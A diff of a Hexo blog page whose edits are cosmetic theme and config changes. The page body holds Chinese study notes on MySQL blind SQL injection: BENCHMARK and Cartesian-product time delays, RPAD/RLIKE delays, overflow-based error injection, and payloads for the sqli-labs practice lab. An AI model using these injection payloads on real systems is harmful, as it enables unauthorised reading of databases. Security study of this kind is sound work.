@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -172,7 +165,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0087.jpg') no-repeat center center;
+         style="background: url('https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152231002.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      19
+      9
        分钟
     </span>
   
@@ -245,17 +238,23 @@
             <!-- SEO header -->
             <h1 style="display: none">SQL</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="time-injection"><a href="#time-injection" class="headerlink" title="time injection"></a>time injection</h2><h3 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h3><p><code>BENCHMARK(loop_count,expr)</code><br>loop_count是重复执行的次数，expr是要执行的表达式       </p>
-<pre><code>mysql&gt; select benchmark(100000000,1+1);
+<div class="hljs"><pre><code>mysql&gt; select benchmark(100000000,1+1);
 +--------------------------+
 | benchmark(100000000,1+1) |
 +--------------------------+
 |                        0 |
 +--------------------------+
-1 row in set (1.48 sec)        </code></pre>
+1 row in set (1.48 sec)        </code></pre></div>
 <p>以此结合and进行时间盲注        </p>
-<pre><code>1=1延时
+<div class="hljs"><pre><code>1=1延时
 
 mysql&gt; select * from guestbook where comment_id=1 and 1=1 and benchmark(10000000,sha(1));
 Empty set (2.04 sec)
@@ -263,19 +262,19 @@ Empty set (2.04 sec)
 1=0，不会延时
 
 mysql&gt; select * from guestbook where comment_id=1 and 1=0 and benchmark(10000000,sha(1));
-Empty set (0.00 sec)</code></pre>
+Empty set (0.00 sec)</code></pre></div>
 <p>以<code>sqllab-less-9</code>为例<br><img src="https://ae04.alicdn.com/kf/U4e8dd5045c0d4f279cefe3efd1232931i.jpg" srcset="/img/loading.gif" alt="01.png"><br>payload：<code>1&#39; and ascii(substr(database(),1,1))&gt;0 and(benchmark(10000000,sha(1)))%23</code>      </p>
 <p>###笛卡尔积<br>笛卡尔积：   </p>
 <p><img src="https://ae02.alicdn.com/kf/U3af545a58a114e0d89199d96773005e5y.jpg" srcset="/img/loading.gif"></p>
-<pre><code>mysql&gt; select count(*) from information_schema.tables;
+<div class="hljs"><pre><code>mysql&gt; select count(*) from information_schema.tables;
 +----------+
 | count(*) |
 +----------+
 |      287 |
 +----------+
-1 row in set (0.00 sec)       </code></pre>
+1 row in set (0.00 sec)       </code></pre></div>
 <p>后面还可以加其他列或者表，从而使其计算花费的时间不同<img src="https://ae03.alicdn.com/kf/Ua5f6439e6b1b43ec9fa741c0cd281150k.jpg" srcset="/img/loading.gif" alt="02.png">       </p>
-<pre><code>1=1 延时
+<div class="hljs"><pre><code>1=1 延时
 mysql&gt; select * from guestbook where comment_id=1 and 1=1 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B);
 +------------+-------------------------+------+
 | comment_id | comment                 | name |
@@ -288,24 +287,24 @@ mysql&gt; select * from guestbook where comment_id=1 and 1=1 and(select count(*)
 
 1=0  不会延时
 mysql&gt; select * from guestbook where comment_id=1 and 1=0 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B);
-Empty set (0.00 sec)</code></pre>
+Empty set (0.00 sec)</code></pre></div>
 <p>依旧可以以and连接构造时间盲注        </p>
 <p>payload：<code>1&#39; and ascii(substr(database(),1,1))&gt;0 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B)#</code>     </p>
 <h3 id="rpad计算延时注入"><a href="#rpad计算延时注入" class="headerlink" title="rpad计算延时注入"></a>rpad计算延时注入</h3><p><code>RPAD(str,len,padstr)</code><br>返回len长度的str，不够的话用padstr补，若str长度大于len,返回len长度的str<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/168746/13/20334/153366/6081a718E1897bbec/8ee657df0325bc7f.png" srcset="/img/loading.gif" alt="03.png">       </p>
 <p><code>expr REGEXP pat</code><br>在expr中匹配pat<br>regexp和rlike同义           </p>
 <p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/178891/22/548/169658/6081a71aE5caf9f70/c753df4964ed571e.png" srcset="/img/loading.gif" alt="04.png">     </p>
-<pre><code>payload： select * from users where id=`1 and if(1=0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);`       </code></pre>
+<div class="hljs"><pre><code>payload： select * from users where id=`1 and if(1=0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);`       </code></pre></div>
 <p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/168677/32/20502/382379/6081a8c3E3c16a0e2/92b76f71f50d585f.png" srcset="/img/loading.gif" alt="05.png">       </p>
 <p>用Level试了一下，似乎没有成功？？？？<img src="https://img12.360buyimg.com/ddimg/jfs/t1/168088/38/20288/29526/60826e5cE14244722/a813234e542af029.png" srcset="/img/loading.gif" alt="06.png">      </p>
 <h3 id="整数溢出报错"><a href="#整数溢出报错" class="headerlink" title="整数溢出报错"></a>整数溢出报错</h3><p>pow      </p>
 <p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/164691/39/20277/134557/608272e2E8727852f/f762dd563901c2b4.png" srcset="/img/loading.gif" alt="07.png">          </p>
 <p>据此可以进行布尔盲注     </p>
 <p>cot(x)—–&gt;返回x的余切      </p>
-<pre><code>mysql&gt; select cot(0);
-ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;       </code></pre>
+<div class="hljs"><pre><code>mysql&gt; select cot(0);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;       </code></pre></div>
 <p><code>exp(x)</code>—-&gt;返回e的x次幂      </p>
-<pre><code>mysql&gt; select exp(999);
-ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;      </code></pre>
+<div class="hljs"><pre><code>mysql&gt; select exp(999);
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;      </code></pre></div>
 <p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/161575/36/20404/34820/608273efEd1d27c04/8b75729a41fd958f.png" srcset="/img/loading.gif" alt="08.png">       </p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>insert报错和时间<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/161571/22/20489/162255/60827dcdE2d218ad0/9f97136a365a1ece.png" srcset="/img/loading.gif" alt="09.png">       </p>
 <p>update报错和时间<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/175936/24/6042/226619/60827f68E3da3cadf/b1618cab9168f4d8.png" srcset="/img/loading.gif" alt="10.png">     </p>
@@ -430,7 +429,7 @@ ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;      </co
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -456,8 +455,6 @@ ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;      </co
 
 
 
-  
-    
   
 
 
